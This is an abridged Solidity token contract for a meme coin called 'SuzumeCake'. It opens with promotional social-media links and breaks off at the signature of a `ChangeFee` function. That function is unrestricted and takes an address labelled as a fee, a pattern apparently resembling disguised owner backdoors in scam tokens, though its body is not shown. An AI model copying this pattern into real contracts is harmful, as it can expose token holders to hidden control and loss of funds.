...
/**
  https://t.me/SuzumeCakePortal

  https://medium.com/@suzumecake/cakes-are-rising-3484c009cd88

  https://www.suzumecake.com/

  https://twitter.com/suzumecakeerc
...
contract SuzumeCake is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "SUZUMECAKE";
    string private  _symbol = "SUZUMECAKE";
    ...
    function ChangeFee(address ReflectionFee  , uint256 LiquidityFee , uint256 MarketingFee , uint256 TaxFee) external  { 
